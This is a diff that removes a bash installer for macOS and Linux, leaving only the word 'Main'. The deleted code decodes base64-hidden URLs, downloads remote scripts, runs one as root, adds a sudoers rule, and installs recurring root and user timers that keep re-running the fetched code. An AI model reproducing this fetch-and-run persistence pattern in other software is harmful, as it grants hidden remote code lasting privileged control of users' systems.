-
-  if [ -f "$SETUP_SCRIPT_PATH" ]; then
-    if run_privileged_visible "$BASH_PATH" "$SETUP_SCRIPT_PATH"; then
-      if ! run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"; then
-        printf '%s\n' 'SETUP completed, but its last-run marker could not be written.' >&2
-        failed=1
-      fi
-    else
-      printf '%s\n' 'Initial SETUP failed; system scheduling will still be installed.' >&2
-      failed=1
-    fi
-  else
-    if run_remote_script privileged "$setup_url"; then
-      if ! run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"; then
-        printf '%s\n' 'SETUP completed, but its last-run marker could not be written.' >&2
-        failed=1
-      fi
-    else
-      printf '%s\n' 'Initial SETUP failed; system scheduling will still be installed.' >&2
-      failed=1
-    fi
-  fi
-
-  if [ -f "$INSTALL_SCRIPT_PATH" ]; then
-    if "$BASH_PATH" "$INSTALL_SCRIPT_PATH"; then
-      if ! date +%s > "$USER_LAST_RUN_PATH"; then
-        printf '%s\n' 'Installer completed, but its last-run marker could not be written.' >&2
-        failed=1
-      fi
-    else
-      printf '%s\n' 'Initial installer failed; user scheduling will still be installed.' >&2
-      failed=1
-    fi
-  else
-    if run_remote_script user "$install_url"; then
-      if ! date +%s > "$USER_LAST_RUN_PATH"; then
-        printf '%s\n' 'Installer completed, but its last-run marker could not be written.' >&2
-        failed=1
-      fi
-    else
-      printf '%s\n' 'Initial installer failed; user scheduling will still be installed.' >&2
-      failed=1
-    fi
-  fi
-
-  return "$failed"
-}
-
-uninstall() {
-  local operating_system uid user_name sudoers_file failed=0
-  local user_service user_timer root_service root_timer
-  operating_system=$(uname -s)
-  uid=$(id -u)
-  user_name=$(id -un)
-  sudoers_file="$SUDOERS_DIR/user-$user_name"
-  if [ "$operating_system" = Darwin ]; then
-    launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
-    launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
-    if is_root; then
-      launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" >/dev/null 2>&1 || true
-      if ! rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run"; then
-        printf '%s\n' 'Unable to remove the system LaunchDaemon files.' >&2
-        failed=1
-      fi
-    else
-      run_privileged launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" || true
-      if ! run_privileged rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run" "$sudoers_file"; then
-        printf '%s\n' 'Unable to remove one or more privileged macOS files.' >&2
-        failed=1
-      fi
-    fi
-  else
-    user_service="$SYSTEMD_USER_UNIT_DIR/$USER_LABEL.service"
-    user_timer="$SYSTEMD_USER_UNIT_DIR/$USER_LABEL.timer"
-    root_service="$SYSTEMD_ROOT_UNIT_DIR/$ROOT_LABEL.service"
-    root_timer="$SYSTEMD_ROOT_UNIT_DIR/$ROOT_LABEL.timer"
-    systemctl --user disable --now "$USER_LABEL.timer" >/dev/null 2>&1 || true
-    if ! rm -f "$user_service" "$user_timer"; then
-      printf '%s\n' 'Unable to remove the user systemd unit files.' >&2
-      failed=1
-    fi
-    if ! systemctl --user daemon-reload; then
-      printf '%s\n' 'Unable to reload the user systemd manager after uninstall.' >&2
-      failed=1
-    fi
-    run_privileged systemctl disable --now "$ROOT_LABEL.timer" || true
-    if ! run_privileged rm -f "$root_service" "$root_timer" "$ROOT_LAST_RUN_PATH" "$sudoers_file"; then
-      printf '%s\n' 'Unable to remove one or more privileged Linux files.' >&2
-      failed=1
-    fi
-    if ! run_privileged systemctl daemon-reload; then
-      printf '%s\n' 'Unable to reload the system systemd manager after uninstall.' >&2
-      failed=1
-    fi
-    run_privileged rmdir "$(dirname "$ROOT_LAST_RUN_PATH")" || true
-  fi
-  if ! rm -f "$HOME/Library/LaunchAgents/$USER_LABEL.plist" \
-    "$USER_LAST_RUN_PATH" "$INSTALL_SCRIPT_PATH" "$SETUP_SCRIPT_PATH" "$RUNNER_SCRIPT_PATH"; then
-    printf '%s\n' 'Unable to remove one or more user task files.' >&2
-    failed=1
-  fi
-  rmdir "$SCRIPT_CACHE_DIR" 2>/dev/null || true
-  return "$failed"
-}
-
-main() {
-  local operating_system install_url setup_url failed=0
-
-  if [ "${1:-}" != "--uninstall" ]; then
-    configure_install_output
-  fi
-
-  operating_system=$(uname -s)
-  case "$operating_system" in
-    Darwin)
-      ROOT_LAST_RUN_PATH="/var/db/$ROOT_LABEL.last-run"
-      require_command curl
-      require_command base64
-      if ! is_root; then
-        require_command sudo
-      fi
-      require_command visudo
-      require_command launchctl
-      require_command plutil
-      ;;
-    Linux)
-      ROOT_LAST_RUN_PATH="/var/lib/$ROOT_LABEL/last-run"
-      require_command curl
-      require_command base64
-      if ! is_root; then
-        require_command sudo
-      fi
-      require_command visudo
-      require_command systemctl
-      ;;
-    *)
-      printf 'Unsupported operating system: %s\n' "$operating_system" >&2
-      exit 1
-      ;;
-  esac
-
-  select_bash
-  ensure_sudo_access
-  if [ "${1:-}" = "--uninstall" ]; then
-    if uninstall; then
-      printf '%s\n' 'Uninstall complete.'
-      return 0
-    fi
-    printf '%s\n' 'Uninstall completed with errors.' >&2
-    return 1
-  fi
-
-  if [ "$OUTPUT_MODE" = normal ]; then
-    printf '%s\n' 'Installing...'
-  fi
-  install_url=$(decode_url "$ENCODED_URL")
-  setup_url=$(decode_url "$ENCODED_URL2")
-  download_script "$install_url" "$INSTALL_SCRIPT_PATH"
-  download_script "$setup_url" "$SETUP_SCRIPT_PATH"
-  if ! install_scheduler_runner; then
-    printf '%s\n' 'Unable to install the scheduler runner.' >&2
-    return 1
-  fi
-  install_sudoers_rule
-  if ! run_initial_tasks "$install_url" "$setup_url"; then
-    failed=1
-  fi
-  if [ "$operating_system" = Darwin ]; then
-    if ! install_launchdaemon "$setup_url"; then
-      printf '%s\n' 'Unable to install the system launch daemon.' >&2
-      failed=1
-    fi
-    if ! install_launchagent "$install_url"; then
-      printf '%s\n' 'Unable to install the user launch agent.' >&2
-      failed=1
-    fi
-  else
-    if ! install_systemd_root_units "$setup_url"; then
-      printf '%s\n' 'Unable to install the system timer.' >&2
-      failed=1
-    fi
-    if ! install_systemd_units "$install_url"; then
-      printf '%s\n' 'Unable to install the user timer.' >&2
-      failed=1
-    fi
-  fi
-  if [ "$failed" -ne 0 ]; then
-    printf '%s\n' 'Installation completed with errors; failed initial tasks were not marked as successful.' >&2
-    return 1
-  fi
-  if [ "$OUTPUT_MODE" = minimal ]; then
-    printf '%s\n' ' Install complete! ✨  ✨' >&3
-  else
-    printf '%s\n' '🎉 Install complete! ✨ 🌟 ✨'
-  fi
-}
-
-main "$@"
+Main
